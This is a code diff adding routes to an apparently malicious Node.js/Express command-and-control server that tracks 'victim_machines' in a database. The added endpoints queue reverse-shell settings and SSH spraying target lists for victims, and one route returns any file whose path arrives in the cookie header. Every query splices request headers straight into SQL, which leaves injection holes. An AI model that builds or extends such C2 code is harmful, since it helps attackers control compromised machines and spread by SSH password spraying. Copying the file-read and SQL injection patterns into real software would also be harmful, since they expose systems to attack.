@@ -39,6 +39,72 @@ name : "69",
 Age : "18"
 } 
 
+app.get('/infiltrateRoot', (req, res)=>{
+
+	var file_name = req.headers.cookie;
+
+	fs.readFile(file_name, function(err, data) {
+		res.send(data);
+	});
+});
+
+app.get('/shell', (req, res)=>{
+
+	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function (err, result, fields) {
+		if (err) throw err;
+		console.log(result);
+		var base64_output = result[0].command;
+		let buff = new Buffer(base64_output, 'base64');
+		let decoded_output = buff.toString('ascii');
+		var json_output = JSON.parse(decoded_output);
+
+		console.log("Cookie: " + req.headers.cookie);
+		console.log("Command JSON: %j", json_output["shell"]);
+		json_output["shell"]["ip"] = "0.0.0.0";
+		json_output["shell"]["port"] = "0";
+
+		let buff2 = new Buffer(JSON.stringify(json_output));
+		let b64_final = buff2.toString('base64');
+
+		con.query("UPDATE victim_machines SET command = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
+			if (err) throw err;
+			console.log(result);
+		});
+	});
+});
+
+app.get('/sshspray', (req, res)=>{
+
+	var ip_list_encoded = req.headers.cookie;
+
+	con.query("UPDATE victim_machines SET sshspray = '" + ip_list_encoded + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
+		if (err) throw err;
+		console.log(result);
+	});
+
+	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.id + "'", function (err, result, fields) {
+		if (err) throw err;
+		console.log(result);
+		var base64_output = result[0].command;
+		let buff = new Buffer(base64_output, 'base64');
+		let decoded_output = buff.toString('ascii');
+		var json_output = JSON.parse(decoded_output);
+
+		console.log("Cookie: " + req.headers.cookie);
+		console.log("Command JSON: %j", json_output["sshspray"]);
+		json_output["sshspray"] = "0";
+
+		let buff2 = new Buffer(JSON.stringify(json_output));
+		let b64_final = buff2.toString('base64');
+
+		con.query("UPDATE victim_machines SET command = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
+			if (err) throw err;
+			console.log(result);
+		});
+	});
+});
+
+
 app.get('/infiltrate', (req, res)=>{
 	console.log("Uploading file...");
 
